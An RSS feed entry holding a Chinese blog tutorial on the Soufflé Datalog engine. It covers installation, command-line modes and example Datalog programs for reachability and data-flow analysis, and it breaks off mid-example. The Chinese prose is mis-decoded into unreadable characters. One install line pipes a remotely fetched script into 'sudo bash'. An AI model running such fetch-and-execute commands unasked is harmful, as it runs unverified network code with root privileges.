      <guid>https://jckling.github.io/2021/11/22/Other/Datalog%20%E5%BC%95%E6%93%8E%20Souffl%C3%A9%20%E6%8C%87%E5%8D%97/</guid>
      <pubDate>Mon, 22 Nov 2021 11:01:43 GMT</pubDate>
      
      <description>å¼€æºå¼•æ“ SoufflÃ© ä»‹ç»åŠä½¿ç”¨</description>
      
      
      
      <content:encoded><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>å‰æ®µæ—¶é—´çœ‹ Doop é¡ºæ‰‹æ•´ç†äº†ç¯‡ <a href="https://jckling.github.io/2021/10/26/Other/LogiQL%20%E5%85%A5%E9%97%A8/">LogiQL å…¥é—¨</a>ï¼Œç°åœ¨æ•´ç†ä¸€ä¸‹ SoufflÃ© çš„ä½¿ç”¨è®°å½•ã€‚SoufflÃ© æ˜¯ä¸€æ¬¾å¼€æºçš„ Datalog å¼•æ“ï¼Œç›¸å¯¹ LogixBlox æ›´æ–°æ›´å¿«ï¼ˆè‡³å°‘æœ‰è®ºæ–‡è¿™ä¹ˆæ€»ç»“ï¼‰ï¼Œè€Œ Doop é»˜è®¤ä½¿ç”¨å’Œç»´æŠ¤äº†ä¸€æ•´å¥— SoufflÃ© çš„è§„åˆ™ã€‚å› ä¸ºæ˜¯å¼€æºå¼•æ“ï¼Œæ‰€ä»¥æœ‰ç›¸å…³å·¥ä½œç›´æ¥å¯¹ Doop å’Œ SoufflÃ© è¿›è¡Œä¿®æ”¹ï¼Œç”¨äºå®ç°ä¸€äº›åˆ†æï¼Œç„¶åå‘äº†é¡¶ä¼šğŸ˜‡ğŸ˜‡ğŸ˜‡</p><p>ç›¸å…³èµ„æ–™çœŸçš„æ˜¯å°‘ï¼Œä¸ç„¶å°±æ˜¯éš¾è¯»ï¼Œåæ­£èŠ±æ—¶é—´çœ‹å‘—ï¼ˆæ‘Šæ‰‹ï¼‰ï¼Œæœ€ç»ˆç›®çš„æ˜¯çœ‹æ‡‚ Doop ä¸­çš„è§„åˆ™ã€‚</p><h1 id="å®‰è£…-Souffle"><a href="#å®‰è£…-Souffle" class="headerlink" title="å®‰è£… SoufflÃ©"></a>å®‰è£… SoufflÃ©</h1><p>å®éªŒä½¿ç”¨ Ubuntu 20.04 è¿›è¡Œï¼Œsouffleã€doopï¼ˆjava8ï¼‰éƒ½å¯ä»¥æˆåŠŸå®‰è£…å’Œä½¿ç”¨ã€‚</p><p>SoufflÃ© æœ‰ä¸€ä¸ªè§£é‡Šå™¨å’Œä¸€ä¸ªç¼–è¯‘å™¨æ¥æ‰§è¡Œ Datalog ç¨‹åºï¼Œé€šè¿‡è„šæœ¬å®‰è£…ã€‚<em>PSï¼šä¸‡ä¸€æ— æ³•ä¸‹è½½ï¼Œå¯èƒ½æ˜¯æœåŠ¡å™¨é—®é¢˜ï¼ˆä¹‹å‰ä¹Ÿå®•æœºè¿‡ï¼‰</em></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ä¸‹è½½</span></span><br><span class="line">curl -s https://packagecloud.io/install/repositories/souffle-lang/souffle/script.deb.sh | sudo bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># å®‰è£…</span></span><br><span class="line">sudo apt install souffle -y</span><br></pre></td></tr></table></figure><h1 id="ä½¿ç”¨-Souffle"><a href="#ä½¿ç”¨-Souffle" class="headerlink" title="ä½¿ç”¨ SoufflÃ©"></a>ä½¿ç”¨ SoufflÃ©</h1><h2 id="ä¸€ä¸ªç®€å•çš„ä¾‹å­"><a href="#ä¸€ä¸ªç®€å•çš„ä¾‹å­" class="headerlink" title="ä¸€ä¸ªç®€å•çš„ä¾‹å­"></a>ä¸€ä¸ªç®€å•çš„ä¾‹å­</h2><p>example.dl å®šä¹‰â€œè¾¹â€å’Œâ€œè·¯å¾„â€</p><ul><li><code>edge</code> æ˜¯ä¸€ä¸ª <code>.input</code> å…³ç³»ï¼Œå°†ä»ç£ç›˜è¯»å–</li><li><code>path</code> æ˜¯ä¸€ä¸ª <code>.output</code> å…³ç³»ï¼Œå°†è¢«å†™å…¥ç£ç›˜</li><li>å¦‚æœæœ‰ä¸€æ¡ä» x åˆ° y çš„è¾¹ï¼Œé‚£ä¹ˆå°±æœ‰ä¸€æ¡ä» x åˆ° y çš„è·¯å¾„</li><li>å¦‚æœæœ‰ä¸€æ¡ä» x åˆ° z çš„è·¯å¾„ï¼Œå¹¶ä¸”ä» z åˆ° y æœ‰ä¸€æ¡è¾¹ï¼Œé‚£ä¹ˆå°±æœ‰ä¸€æ¡ä» x åˆ° y çš„è·¯å¾„</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(x:number, y:number)  // å£°æ˜</span><br><span class="line">.input edge     // æ²¡æœ‰æŒ‡å®šæ–‡ä»¶ï¼Œé»˜è®¤ä» edge.facts ä¸­è¯»å–</span><br><span class="line"></span><br><span class="line">.decl path(x:number, y:number)  // å£°æ˜</span><br><span class="line">.output path    // è¾“å‡ºä¸º path.csv</span><br><span class="line"></span><br><span class="line">// å®šä¹‰ï¼Œæ³¨æ„æœ«å°¾çš„ . ç¬¦å·</span><br><span class="line">path(x, y) :- edge(x, y).</span><br><span class="line">path(x, y) :- path(x, z), edge(z, y).</span><br></pre></td></tr></table></figure><p>å¦‚æœè¾“å…¥çš„ <code>edge</code> å…³ç³»æ˜¯å›¾ä¸­çš„é¡¶ç‚¹å¯¹ï¼Œæ ¹æ®ä¸Šé¢çš„ä¸¤ä¸ªè§„åˆ™ï¼Œè¾“å‡ºçš„è·¯å¾„å…³ç³»å°†æä¾›æ‰€æœ‰é¡¶ç‚¹å¯¹ x å’Œ yï¼Œå³å›¾ä¸­å­˜åœ¨ x åˆ° y çš„è·¯å¾„ã€‚</p><p>è¾“å…¥æ–‡ä»¶ edge.factsï¼Œä½¿ç”¨åˆ¶è¡¨ç¬¦åˆ†éš”ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">2 3</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œåˆ†æï¼Œ<code>-F</code> è¡¨ç¤ºè¾“å…¥æ–‡ä»¶è·¯å¾„ï¼Œ<code>-D</code> è¡¨ç¤ºè¾“å‡ºæ–‡ä»¶è·¯å¾„ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. example.dl</span><br><span class="line"><span class="comment"># souffle -F./input -D./output example.dl</span></span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹è¾“å‡ºæ–‡ä»¶ path.csvï¼ŒåŒ…å«æ‰€æœ‰å­˜åœ¨è·¯å¾„çš„é¡¶ç‚¹å¯¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">12</span><br><span class="line">23</span><br><span class="line">13</span><br></pre></td></tr></table></figure><p>ä¸Šé¢è¿è¡Œçš„æ˜¯ <strong>è§£é‡Šå™¨æ¨¡å¼</strong>ï¼ŒSoufflÃ© è¿˜æ”¯æŒ <strong>ç¼–è¯‘å™¨æ¨¡å¼</strong>ï¼Œå°† Datalog ç¨‹åºè½¬æ¢ä¸º C++ ç¨‹åºï¼Œç„¶åç¼–è¯‘ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä½¿ç”¨ <code>-o</code> å‚æ•°ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># ç”Ÿæˆå¯æ‰§è¡Œæ–‡ä»¶</span></span><br><span class="line">souffle -F. -D. -oexample example.dl</span><br><span class="line"></span><br><span class="line"><span class="comment"># æ‰§è¡Œåˆ†æ</span></span><br><span class="line">./example -F. -D. example.dl</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/22/BIYwt49Tdufm8gU.png"></p><p><code>-r</code> å‚æ•°ç”¨äºè°ƒè¯•ï¼Œç”Ÿæˆ HTML æ ¼å¼çš„è°ƒè¯•æŠ¥å‘Š <a href="https://github.com/jckling/Assets/blob/master/others/example.html">example.html</a>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. -rexample.html example.dl</span><br></pre></td></tr></table></figure><p><code>-p</code> å‚æ•°ç”¨äºåˆ†æï¼Œä»¥ä¸‹å‘½ä»¤å°†åˆ›å»ºä¸€ä¸ªåŒ…å«åˆ†æä¿¡æ¯çš„æ—¥å¿—æ–‡ä»¶ <a href="https://github.com/jckling/Assets/blob/master/others/example.log">example.log</a>ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffle -F. -D. -pexample.log example.dl</span><br></pre></td></tr></table></figure><p>souffle è¿˜æä¾›äº†ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…· <code>souffleprof</code>ï¼Œå¯ç”¨äºåˆ†æ example.logï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souffleprof example.log</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/11/22/k5K69OytM8igDXB.jpg"></p><h2 id="ä¾‹1"><a href="#ä¾‹1" class="headerlink" title="ä¾‹1"></a>ä¾‹1</h2><p>Datalog æ˜¯ä¸€ç§ï¼ˆå£°æ˜å¼ï¼‰åŸºäºé€»è¾‘çš„æŸ¥è¯¢è¯­è¨€ï¼Œå…è®¸ç”¨æˆ·æ‰§è¡Œé€’å½’æŸ¥è¯¢ã€‚Datalog è¯­æ³•çš„è§„èŒƒæ²¡æœ‰ç»Ÿä¸€çš„æ ‡å‡†ï¼Œé€šå¸¸é‡‡ç”¨ Prolog é£æ ¼çš„è¯­æ³•ã€‚SoufflÃ© çš„è¯­æ³•å—åˆ° Datalog å®ç°çš„å¯å‘ï¼Œå³ Z3 ä¸­çš„ bddbddb(BDD-Based Deductive DataBase) å’Œ muZã€‚</p><p>SoufflÃ© ä¸ºå¤§è§„æ¨¡é¢å‘é€»è¾‘çš„ç¼–ç¨‹æä¾›äº†è½¯ä»¶å·¥ç¨‹åŠŸèƒ½ï¼ˆä¾‹å¦‚ç»„ä»¶ï¼‰ï¼Œå¯¹äºå®é™…ä½¿ç”¨ï¼ŒSoufflÃ© é€šè¿‡ç®—æœ¯å‡½å­ï¼ˆarithmetic functorsï¼‰æ‰©å±•äº† Datalog ä½¿å…¶å›¾çµç­‰ä»·ï¼Œè®©ç¨‹åºå‘˜èƒ½å¤Ÿç¼–å†™éç»ˆæ­¢çš„ç¨‹åºã€‚</p><ul><li>éç»ˆæ­¢çš„ä¸€ä¸ªä¾‹å­æ˜¯äº‹å® A(0) å’Œè§„åˆ™ A(i + 1) :- A(i)ï¼Œæ²¡æœ‰é¢å¤–çš„çº¦æŸ</li><li>è¿™å¯¼è‡´ SoufflÃ© å°è¯•è¾“å‡ºæ— é™æ•°é‡çš„å…³ç³» A(n)ï¼Œå…¶ä¸­ n &gt;&#x3D; 0</li><li>è¿™åœ¨æŸç§ç¨‹åº¦ä¸Šç±»ä¼¼äº C ç­‰å‘½ä»¤å¼ç¼–ç¨‹è¯­è¨€ä¸­çš„æ— é™ while å¾ªç¯ã€‚ä½†æ˜¯ï¼Œç®—æœ¯å‡½å­æä¾›çš„è¡¨è¾¾èƒ½åŠ›å¢å¼ºéå¸¸æ–¹ä¾¿ç¼–ç¨‹ã€‚</li></ul><h3 id="ä¼ é€’é—­åŒ…"><a href="#ä¼ é€’é—­åŒ…" class="headerlink" title="ä¼ é€’é—­åŒ…"></a>ä¼ é€’é—­åŒ…</h3><p>é›†åˆ X ä¸Šçš„å…³ç³» R æ˜¯å¯ä¼ é€’çš„ï¼Œå¦‚æœå¯¹äº X ä¸­çš„æ‰€æœ‰ xã€yã€zï¼Œå½“ <code>x R y</code> ä¸” <code>y R z</code> åˆ™ <code>x R z</code>ã€‚ä¸‹é¢çš„ç¤ºä¾‹è¡¨ç¤ºæœ‰å‘å›¾ï¼Œå…¶ä¸­è¾¹å®šä¹‰å…³ç³»ï¼Œå¦‚æœå…ƒç»„æ»¡è¶³ä»¥ä¸‹ä¸¤ä¸ªè§„åˆ™ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œåˆ™å…ƒç»„å¤„äºä¼ é€’é—­åŒ…ï¼ˆå¯è¾¾å…³ç³»ï¼‰ä¸­ã€‚</p><ul><li>å®é™…ä¸Šï¼Œedge ä¸­çš„æ‰€æœ‰å…ƒç´ éƒ½æ˜¯å¯è¾¾çš„ï¼ˆæ ¹æ®åŸºæœ¬è§„åˆ™ï¼‰ï¼Œå½’çº³è§„åˆ™æ•è·äº†ä¼ é€’å±æ€§ï¼ŒåŒ…æ‹¬åƒ <code>reachable(&quot;a&quot;, &quot;d&quot;)</code> è¿™æ ·çš„å…ƒç»„ã€‚</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(n: symbol, m: symbol)</span><br><span class="line">edge(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="comment">/* facts of edge */</span></span><br><span class="line">edge(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;c&quot;</span>).</span><br><span class="line">edge(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;b&quot;</span>).</span><br><span class="line">edge(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;d&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl reachable (n: symbol, m: symbol)</span><br><span class="line"></span><br><span class="line">.output reachable // output relation reachable</span><br><span class="line"></span><br><span class="line">reachable(x, y):- edge(x, y). // base rule</span><br><span class="line">reachable(x, z):- edge(x, y), reachable(y, z). // inductive rule</span><br></pre></td></tr></table></figure><h3 id="åŒä»£"><a href="#åŒä»£" class="headerlink" title="åŒä»£"></a>åŒä»£</h3><p>ç»™å®šä¸€æ£µæ ‘ï¼ˆå…·æœ‰ç‰¹å®šæ ¹èŠ‚ç‚¹çš„æœ‰å‘æ— ç¯å›¾ï¼‰ï¼Œç›®æ ‡æ˜¯æ‰¾åˆ°å“ªäº›èŠ‚ç‚¹å¤„äºåŒä¸€çº§åˆ«ã€‚</p><ul><li>ä¸‹å›¾ä¸­èŠ‚ç‚¹ b å’Œ c å¤„äºåŒä¸€çº§åˆ«ï¼ŒèŠ‚ç‚¹ e å’Œ g ä¹Ÿå¤„äºåŒä¸€çº§åˆ«ã€‚</li></ul><p><img src="https://souffle-lang.github.io/img/same_generation_graph.jpg"></p><p>å®šä¹‰ Parent å…³ç³»ï¼Œç„¶åæè¿°è¿™æ£µæ ‘ï¼›å®šä¹‰ Person å…³ç³»å’Œ SameGeneration å…³ç³»</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">Parent</span>(n: symbol, m: symbol)  // å­ä»£ï¼Œçˆ¶ä»£</span><br><span class="line"><span class="symbol">Parent</span>(<span class="string">&quot;d&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;e&quot;</span>, <span class="string">&quot;b&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;f&quot;</span>,<span class="string">&quot;c&quot;</span>).</span><br><span class="line"><span class="symbol">Parent</span>(<span class="string">&quot;g&quot;</span>, <span class="string">&quot;c&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;a&quot;</span>). <span class="symbol">Parent</span>(<span class="string">&quot;c&quot;</span>,<span class="string">&quot;a&quot;</span>).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">Person</span>(n: symbol)</span><br><span class="line"><span class="symbol">Person</span>(x) :- <span class="symbol">Parent</span>(x, <span class="symbol">_</span>).  // å­ä»£</span><br><span class="line"><span class="symbol">Person</span>(x) :- <span class="symbol">Parent</span>(<span class="symbol">_</span>, x).  // çˆ¶ä»£</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">SameGeneration</span> (n: symbol, m: symbol)</span><br><span class="line"><span class="symbol">SameGeneration</span>(x, x):- <span class="symbol">Person</span>(x).   // è‡ªå·±å’Œè‡ªå·±æ˜¯åŒä»£</span><br><span class="line"><span class="symbol">SameGeneration</span>(x, y):- <span class="symbol">Parent</span>(x,p), <span class="symbol">SameGeneration</span>(p,q), <span class="symbol">Parent</span>(y,q).   // çˆ¶ä»£ç›¸ç­‰æ—¶ï¼Œå­ä»£æ˜¯åŒä»£</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">SameGeneration</span></span><br></pre></td></tr></table></figure><h3 id="æ•°æ®æµåˆ†æ"><a href="#æ•°æ®æµåˆ†æ" class="headerlink" title="æ•°æ®æµåˆ†æ"></a>æ•°æ®æµåˆ†æ</h3><p>æ•°æ®æµåˆ†æï¼ˆData-flow analysis, DFAï¼‰æ—¨åœ¨ç¡®å®šç¨‹åºçš„é™æ€å±æ€§ï¼ŒåŸºäºæ§åˆ¶æµå›¾ï¼ˆCall Flow Graphs, CFGï¼‰ï¼Œæ ¹æ®èŠ‚ç‚¹å’Œå›¾çš„å±æ€§è¿›è¡Œç¨‹åºåˆ†æã€‚</p><p>ä¸€ä¸ªä¾‹å­æ˜¯å¯è¾¾æ€§å®šä¹‰ï¼ˆreaching definitionï¼‰ï¼šå˜é‡çš„å®šä¹‰æ˜¯å¦åˆ°è¾¾ç¨‹åºä¸­ç‰¹å®šçš„ç‚¹ã€‚å› ä¸ºå˜é‡çš„èµ‹å€¼å¯ä»¥ç›´æ¥å½±å“ç¨‹åºä¸­å¦ä¸€ç‚¹çš„å€¼ï¼Œè¿™é‡Œè€ƒè™‘å˜é‡ v çš„æ˜ç¡®å®šä¹‰ dï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">d: v = &lt;expression&gt;;</span><br></pre></td></tr></table></figure><p>å¦‚æœä» d åˆ° u çš„æ‰€æœ‰è·¯å¾„éƒ½ä¸åŒ…å« v çš„ä»»ä½•æ˜ç¡®å®šä¹‰ï¼Œåˆ™å˜é‡ v çš„å®šä¹‰ d è¢«è®¤ä¸ºå¯åˆ°è¾¾è¯­å¥ uã€‚æ³¨æ„å³ä½¿æ²¡æœ‰æ˜ç¡®çš„å®šä¹‰ï¼Œå‡½æ•°ä¹Ÿå¯èƒ½å¯¹å˜é‡äº§ç”Ÿå‰¯ä½œç”¨ã€‚</p><p>è€ƒè™‘ä»¥ä¸‹æ§åˆ¶æµå›¾ï¼ŒåŒ…å«å˜é‡ v çš„æ˜ç¡®å®šä¹‰ d1 å’Œ d2ï¼Œåªæœ‰ d2 å®šä¹‰çš„ v èƒ½è¾¾åˆ° B3ã€‚</p><p><img src="https://souffle-lang.github.io/img/reaching_definition.jpg"></p><p>ä»¥ä¸‹ä»£ç è¾“å‡º CFG çš„æ‰€æœ‰é˜¶æ®µï¼Œå…¶ä¸­ v å¯èƒ½è¢«è¿™äº›å®šä¹‰ä¹‹ä¸€æ•è·ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">// define control flow graph</span><br><span class="line">// via the <span class="symbol">Edge</span> relation</span><br><span class="line">.decl <span class="symbol">Edge</span>(n: symbol, m: symbol)    // è¾¹ n -&gt; m</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;start&quot;</span>, <span class="string">&quot;b1&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b1&quot;</span>, <span class="string">&quot;b2&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b1&quot;</span>, <span class="string">&quot;b3&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;b4&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b3&quot;</span>, <span class="string">&quot;b4&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;b1&quot;</span>).</span><br><span class="line"><span class="symbol">Edge</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;end&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Generating</span> <span class="symbol">Definitions</span></span><br><span class="line">.decl <span class="symbol">GenDef</span>(n: symbol, d:symbol)   // ç”Ÿæˆå®šä¹‰ n -&gt; d</span><br><span class="line"><span class="symbol">GenDef</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;d1&quot;</span>).</span><br><span class="line"><span class="symbol">GenDef</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;d2&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Killing</span> <span class="symbol">Definitions</span></span><br><span class="line">.decl <span class="symbol">KillDef</span>(n: symbol, d:symbol)  // é”€æ¯å®šä¹‰ n -&gt; d</span><br><span class="line"><span class="symbol">KillDef</span>(<span class="string">&quot;b4&quot;</span>, <span class="string">&quot;d1&quot;</span>).</span><br><span class="line"><span class="symbol">KillDef</span>(<span class="string">&quot;b2&quot;</span>, <span class="string">&quot;d2&quot;</span>).</span><br><span class="line"></span><br><span class="line">// <span class="symbol">Reachable</span></span><br><span class="line">.decl <span class="symbol">Reachable</span>(n: symbol, d:symbol)    // å¯è¾¾å®šä¹‰</span><br><span class="line"><span class="symbol">Reachable</span>(u,d) :- <span class="symbol">GenDef</span>(u,d).  //ç”Ÿæˆç‚¹å¿…å®šå¯è¾¾</span><br><span class="line"><span class="symbol">Reachable</span>(v,d) :- <span class="symbol">Edge</span>(u,v), <span class="symbol">Reachable</span>(u,d), !<span class="symbol">KillDef</span>(u,d). // è¾¹uvï¼Œu ç‚¹å¯è¾¾ä¸”æ²¡æœ‰é”€æ¯å®šä¹‰ dï¼Œåˆ™ d å¯è¾¾ v</span><br><span class="line"></span><br><span class="line">.output <span class="symbol">Reachable</span></span><br></pre></td></tr></table></figure><h3 id="å…³äºè¾“å…¥å’Œ-C-é¢„å¤„ç†å™¨çš„å¤‡æ³¨"><a href="#å…³äºè¾“å…¥å’Œ-C-é¢„å¤„ç†å™¨çš„å¤‡æ³¨" class="headerlink" title="å…³äºè¾“å…¥å’Œ C é¢„å¤„ç†å™¨çš„å¤‡æ³¨"></a>å…³äºè¾“å…¥å’Œ C é¢„å¤„ç†å™¨çš„å¤‡æ³¨</h3><p>ä¸ C++ ä¸€æ ·ï¼ŒSoufflÃ© ä½¿ç”¨ä¸¤ç§ç±»å‹çš„æ³¨é‡Šï¼š</p><ul><li>ç±»å‹ 1ï¼š<code>// è¿™æ˜¯å¤‡æ³¨</code></li><li>ç±»å‹ 2ï¼š<code>/* è¿™ä¹Ÿæ˜¯å¤‡æ³¨ */</code></li></ul><p>C é¢„å¤„ç†å™¨å¤„ç†æ¥è‡ª SoufflÃ© çš„è¾“å…¥ï¼ˆå³å¯ä»¥ä½¿ç”¨å®ï¼‰ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#include &quot;myprog.dl&quot;</span><br><span class="line">#define MYPLUS(a,b) (a+b)</span><br></pre></td></tr></table></figure><h2 id="ä¾‹2ï¼šå…³ç³»"><a href="#ä¾‹2ï¼šå…³ç³»" class="headerlink" title="ä¾‹2ï¼šå…³ç³»"></a>ä¾‹2ï¼šå…³ç³»</h2><h3 id="å…³ç³»å®šä¹‰"><a href="#å…³ç³»å®šä¹‰" class="headerlink" title="å…³ç³»å®šä¹‰"></a>å…³ç³»å®šä¹‰</h3><p>å…³ç³»å¿…é¡»å£°æ˜åæ‰èƒ½ä½¿ç”¨ï¼Œåœ¨ SoufflÃ© ä»£ç ä¸­ç¼–å†™ä»£ç è¡Œçš„é¡ºåºä¸ä¼šå½±å“ç¨‹åºçš„æ­£ç¡®æ€§ã€‚ä½¿ç”¨ä¸¤ä¸ªå­—æ®µ a å’Œ b å£°æ˜å…³ç³» <code>edge</code>ï¼Œæ¯ä¸ªå­—æ®µéƒ½æ˜¯ç¬¦å·ï¼ˆå­—ç¬¦ä¸²ï¼‰ã€‚</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.decl edge(a:symbol, b:symbol)</span><br></pre></td></tr></table></figure><h3 id="I-x2F-O-æŒ‡ä»¤"><a href="#I-x2F-O-æŒ‡ä»¤" class="headerlink" title="I&#x2F;O æŒ‡ä»¤"></a>I&#x2F;O æŒ‡ä»¤</h3><p>ç”¨æˆ·å¯ä»¥æŒ‡å®šç”¨äºåŠ è½½è¾“å…¥å’Œå°†è¾“å‡ºå†™å…¥æ–‡ä»¶çš„æŒ‡ä»¤ï¼š</p><ul><li>è¾“å…¥æŒ‡ä»¤ <code>.input &lt;relation-name&gt;</code> ä» <code>&lt;relation-name&gt;.facts</code> è¯»å–ï¼Œé»˜è®¤æƒ…å†µä¸‹ç”±åˆ¶è¡¨ç¬¦åˆ†éš”</li><li>è¾“å‡ºæŒ‡ä»¤ <code>.output &lt;relation-name&gt;</code> å†™å…¥æ–‡ä»¶ï¼Œé€šå¸¸æ˜¯ <code>&lt;relation-name&gt;.csv</code>ï¼ˆé»˜è®¤ï¼‰æˆ– stdoutï¼ˆå–å†³äºé€‰é¡¹ï¼‰</li><li>æ‰“å°å…³ç³»å¤§å°æŒ‡ä»¤ <code>.printsize &lt;relation-name&gt;</code> å°†ç»™å®šå…³ç³»çš„åŸºæ•°ï¼ˆcardinalityï¼‰æ‰“å°åˆ°æ ‡å‡†è¾“å‡ºã€‚</li></ul><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(n: symbol)</span><br><span class="line">.input <span class="symbol">A</span> // facts are read from file <span class="symbol">A</span>.facts</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">B</span>(n: symbol)</span><br><span class="line"><span class="symbol">B</span>(n) :- <span class="symbol">A</span>(n).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">C</span>(n: symbol)</span><br><span class="line">.output <span class="symbol">C</span> // output appears in <span class="symbol">C</span>.csv</span><br><span class="line"><span class="symbol">C</span>(n) :- <span class="symbol">B</span>(n).</span><br><span class="line"></span><br><span class="line">.decl <span class="symbol">D</span>(n: symbol)</span><br><span class="line">.printsize <span class="symbol">D</span> // the number of facts in <span class="symbol">D</span> is printed</span><br><span class="line"><span class="symbol">D</span>(n) :- <span class="symbol">C</span>(n).</span><br></pre></td></tr></table></figure><p>å…³ç³»å¯ä»¥ä»ä»¥ä¸‹æ–‡ä»¶åŠ è½½æˆ–å†™å…¥ä»¥ä¸‹æ–‡ä»¶ï¼š</p><ul><li>ä»»æ„ CSV æ–‡ä»¶</li><li>å‹ç¼©çš„æ–‡æœ¬æ–‡ä»¶</li><li>SQLite3 æ•°æ®åº“</li></ul><p>ä¾‹å¦‚ï¼Œè¦å°†è¯„ä¼°åçš„å…³ç³»å­˜å‚¨åˆ° SQLite3 æ•°æ®åº“ä¸­ï¼Œç”¨æˆ·å¯ä»¥æŒ‡å®šå¦‚ä¸‹å†…å®¹ï¼š</p><figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.decl <span class="symbol">A</span>(a:number, b:number)</span><br><span class="line">.output 